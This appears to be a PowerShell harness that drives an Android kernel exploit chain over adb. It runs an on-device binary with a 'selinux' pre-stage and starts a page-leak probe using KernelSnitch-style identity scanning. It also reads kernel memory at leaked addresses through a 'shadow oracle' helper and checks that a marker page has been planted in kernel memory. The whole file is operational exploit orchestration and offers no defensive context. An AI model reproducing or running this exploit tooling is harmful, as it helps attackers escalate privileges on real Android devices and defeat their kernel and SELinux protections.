param(
    [Parameter(Mandatory)]
    [string]$Serial,
    [string]$Q0 = "/data/local/tmp/qroutehold2",
    [string]$Probe = "/data/local/tmp/page-leak-probe",
    [string]$Dir = "/data/local/tmp/clean-oracle",
    [int]$TimeoutSeconds = 180,
    [int]$HoldSeconds = 90
)

$ErrorActionPreference = "Stop"
$adb = (Get-Command adb -ErrorAction Stop).Source
$shadow = Join-Path $PSScriptRoot "shadow-arw.ps1"
$logPath = "$Dir/page-calibration.log"
$selinuxLogPath = "$Dir/page-calibration-selinux.log"
$selinuxPid = $null

function Invoke-Device([string]$Command) {
    return ((& $adb -s $Serial shell $Command 2>&1) -join "`n")
}

function Stop-Probe {
    Invoke-Device "rm -f $Dir/page-abort.tmp; : > $Dir/page-abort.tmp; mv $Dir/page-abort.tmp $Dir/page-abort" | Out-Null
}

if (-not (Test-Path $adb -PathType Leaf)) { throw "adb not found: $adb" }
if ($Dir -notmatch "^/[A-Za-z0-9._/-]+$") { throw "bad oracle dir" }
if ($Probe -notmatch "^/[A-Za-z0-9._/-]+$") { throw "bad probe path" }
if ($Q0 -notmatch "^/[A-Za-z0-9._/-]+$") { throw "bad q0 path" }
if ($TimeoutSeconds -lt 10 -or $HoldSeconds -lt 10) { throw "bad timeout" }

Invoke-Device "rm -f $Dir/page-go $Dir/page-abort $Dir/page-release $Dir/request $Dir/response $logPath $selinuxLogPath" | Out-Null
$selinuxStart = "A53_PREFETCH_EDGE_RUN=8 A53_PREFETCH_REPEATS=3 nohup $Q0 selinux >$selinuxLogPath 2>&1 & echo `$!"
$selinuxPidText = Invoke-Device $selinuxStart
if ($selinuxPidText -match "(\d+)") { $selinuxPid = [int]$Matches[1] }
if (-not $selinuxPid) { throw "could not start selinux pre-stage: $selinuxPidText" }

$selinuxDeadline = (Get-Date).AddSeconds($TimeoutSeconds)
while ((Get-Date) -lt $selinuxDeadline) {
    $selinuxLog = Invoke-Device "cat $selinuxLogPath 2>/dev/null"
    if ($selinuxLog -match "consume done;") { break }
    if ($selinuxLog -match "FAIL |CHAIN_FAIL") {
        Invoke-Device "kill $selinuxPid 2>/dev/null" | Out-Null
        throw "selinux pre-stage failed:`n$selinuxLog"
    }
    Start-Sleep -Milliseconds 500
}
if ($selinuxLog -notmatch "consume done;") {
    Invoke-Device "kill $selinuxPid 2>/dev/null" | Out-Null
    throw "selinux pre-stage timeout:`n$selinuxLog"
}
Write-Output "selinux pre-stage ready pid=$selinuxPid"

# Discover mapped kernel windows through the shadow oracle and narrow the
# KernelSnitch identity scan to them (crash-safe: oracle reads are now gated
# by a page-table walk).
$windowsText = ""
try {
    $win = & $shadow -Serial $Serial -Dir $Dir -Operation windows
    $winText = ($win -join "`n").Trim()
    if ($winText -match "^OK ([0-9a-fA-Fx,-]+)$") {
        $windowsText = $Matches[1]
        Write-Output "identity windows: $windowsText"
    } else {
        Write-Warning "windows query failed: $winText"
    }
} catch {
    Write-Warning "windows query error: $_"
}

$probeEnv = "PAGE_LEAK_CALIBRATE=1 PAGE_LEAK_VERBOSE=1 PAGE_LEAK_HOLD_SEC=$HoldSeconds PAGE_LEAK_RELEASE_PATH=$Dir/page-release"
if ($windowsText) {
    $probeEnv = "KSNITCH_IDENTITY_WINDOWS=$windowsText KSNITCH_VALIDATE_COLLISIONS=1 $probeEnv"
}
$start = "$probeEnv nohup $Probe >$logPath 2>&1 & echo `$!"
$probePidText = Invoke-Device $start
$probePid = $null
if ($probePidText -match "(\d+)") { $probePid = [int]$Matches[1] }
if (-not $probePid) { throw "could not start probe: $probePidText" }
Start-Sleep -Seconds 2
$alive = Invoke-Device "kill -0 $probePid 2>/dev/null && echo 1"
if ($alive -notmatch "1") {
    Stop-Probe
    Invoke-Device "kill $selinuxPid 2>/dev/null" | Out-Null
    throw "probe died at start:`n$(Invoke-Device "cat $logPath 2>/dev/null")"
}
Write-Output "probe started pid=$probePid"

$candidateLine = $null
$compareLine = $null
$deadline = (Get-Date).AddSeconds($TimeoutSeconds)
while ((Get-Date) -lt $deadline) {
    $log = Invoke-Device "cat $logPath 2>/dev/null"
    if ($log -match "PAGE_CALIBRATION_PERF_UNAVAILABLE|PAGE_CALIBRATION_REJECT") {
        Stop-Probe
        Invoke-Device "kill $selinuxPid 2>/dev/null" | Out-Null
        throw "calibration stopped before gate:`n$log"
    }
    $candidateLine = ($log -split "`n" | Where-Object { $_ -match "PAGE_LEAK_CANDIDATE" } | Select-Object -Last 1)
    $compareLine = ($log -split "`n" | Where-Object { $_ -match "PAGE_CALIBRATION_COMPARE" } | Select-Object -Last 1)
    if ($candidateLine -and $compareLine -and $compareLine -match "accepted=1") {
        break
    }
    Start-Sleep -Milliseconds 500
}
if (-not $candidateLine -or -not $compareLine -or $compareLine -notmatch "accepted=1") {
    Stop-Probe
    Invoke-Device "kill $selinuxPid 2>/dev/null" | Out-Null
    throw "calibration candidate timeout:`n$(Invoke-Device "cat $logPath 2>/dev/null")"
}

$candidateMatch = [regex]::Match($candidateLine, "mm=0x([0-9a-fA-F]+) base=0x([0-9a-fA-F]+) payload=0x([0-9a-fA-F]+)")
if (-not $candidateMatch.Success) {
    Stop-Probe
    Invoke-Device "kill $selinuxPid 2>/dev/null" | Out-Null
    throw "bad candidate line: $candidateLine"
}
$mm = "0x" + $candidateMatch.Groups[1].Value
$base = "0x" + $candidateMatch.Groups[2].Value
$payload = "0x" + $candidateMatch.Groups[3].Value
Write-Output "candidate mm=$mm base=$base payload=$payload"
Write-Output $compareLine

try {
    $before = & $shadow -Serial $Serial -Dir $Dir -Operation read -Address $base -Length 0x3c0
    $beforeText = ($before -join "`n").Trim()
    if ($beforeText -notmatch "^OK [0-9a-fA-F]+$") { throw "oracle pre-read failed: $beforeText" }
    $beforeHex = $beforeText.Substring(3).Trim()
    if ($beforeHex -notmatch "[1-9a-fA-F]") { throw "oracle pre-read is all zero" }
    Write-Output "oracle pre-read ok bytes=0x3c0"

    Invoke-Device "printf '%s\n' $base > $Dir/page-go.tmp; mv $Dir/page-go.tmp $Dir/page-go" | Out-Null

    $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
    $done = $false
    while ((Get-Date) -lt $deadline) {
        $log = Invoke-Device "cat $logPath 2>/dev/null"
        if ($log -match "PAGE_LEAK_OK") { $done = $true; break }
        if ($log -match "PAGE_LEAK_GATE_ABORT|PAGE_CALIBRATION_REJECT|FAIL ") { break }
        Start-Sleep -Milliseconds 500
    }
    if (-not $done) { throw "probe did not reach PAGE_LEAK_OK:`n$(Invoke-Device "cat $logPath 2>/dev/null")" }

    $marker = & $shadow -Serial $Serial -Dir $Dir -Operation read -Address $base -Length 14
    $markerText = ($marker -join "`n").Trim()
    $expected = "524d472d434c45414e2d50414745"
    if ($markerText -ne "OK $expected") { throw "marker mismatch: $markerText" }
    Write-Output "oracle marker ok base=$base text=RMG-CLEAN-PAGE"
    Invoke-Device ": > $Dir/page-release.tmp; mv $Dir/page-release.tmp $Dir/page-release" | Out-Null
    Invoke-Device "kill $selinuxPid 2>/dev/null" | Out-Null
    Write-Output "calibration result=accepted same_page=1 q2_write=0"
}
catch {
    Stop-Probe
    Invoke-Device "kill $selinuxPid 2>/dev/null" | Out-Null
    throw
}
